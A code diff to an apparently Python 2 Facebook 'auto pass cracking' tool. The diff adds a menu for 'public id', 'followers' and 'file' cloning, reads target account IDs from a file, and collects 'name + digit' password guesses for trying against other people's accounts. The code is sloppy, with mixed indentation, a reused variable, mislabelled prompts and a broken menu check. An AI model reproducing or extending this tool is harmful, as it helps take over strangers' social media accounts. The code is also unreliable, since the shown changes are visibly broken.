@@ -35,7 +35,7 @@ c3 = "\033[1;31m"
 os.system('git pull')
 os.system('clear')
 logo = """
-os.system('echo -e "\n\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Zahra Zohaib)-(Janzada Khan)\n-----------------------------------------------" | lolcat')  """  
+\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Zahra Zohaib)-(Janzada Khan)\n-----------------------------------------------  """  
 def reg():
     os.system('clear')
     print logo
@@ -333,7 +333,28 @@ def menu_s():
         print ''
         menu_s()
 
-
+def crack():
+    global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"Token invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		os.system('python2 jam.py')
+	os.system('clear')
+    print logo
+    print ''
+    print '\033[1;31;1m~~~~ Auto pass cracking ~~~~'
+    print ''
+    print '\033[1;92m[1] Public id cloning'
+    print '\033[1;92m[2] Followers cloning'
+    print '\033[1;92m[3] File cloning'
+    print '\033[1;92m[0] Back'
+    print ''
+    a_s()
+    
 def auto_crack():
     global token
     
@@ -354,7 +375,8 @@ def auto_crack():
     print ''
     print '\033[1;92m[1] Public id cloning'
     print '\033[1;92m[2] Followers cloning'
-    print '\033[1;92m[B] Back'
+    print '\033[1;92m[3] File cloning'
+    print '\033[1;92m[0] Back'
     print ''
     a_s()
 
@@ -375,7 +397,9 @@ def a_s():
         p1 = raw_input(' \033[1;92m[1]Name + digit: ')
         p2 = raw_input(' \033[1;92m[2]Name + digit: ')
         p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+        p3 = raw_input(' \033[1;92m[4]Name + digit: ')
         p4 = raw_input(' \033[1;92m[4]Name + digit: ')
+        p5 = raw_input(' \033[1;92m[4]Name + digit: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -440,6 +464,33 @@ def a_s():
             na = i['name']
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
+            
+    elif a_s == '3':
+        os.system('clear')
+        print logo
+        print ''
+        print '\033[1;31;1m~~~~ Auto pass public cracking ~~~~'
+        print ''
+        print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
+        print ''
+        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
+        p5 = raw_input(' \033[1;92m[4]Name + digit: ')
+        p6 = raw_input(' \033[1;92m[4]Name + digit: ')
+        p7 = raw_input(' \033[1;92m[4]Name + digit: ')
+        p8 = raw_input(' \033[1;92m[4]Name + digit: ')
+        idt = raw_input(' \033[1;93m[★]Enter id: ')
+        
+        try:
+	        idlist= raw_input('[+] File Name: ')
+	        for line in open(idlist ,'r').readlines():
+	            id.append(line.strip())
+	    except IOError:
+	         print"[!] File Not Found."
+	         raw_input('Press Enter To Back. ')
+	         crack()
         
     elif a_s == '0':
         menu()
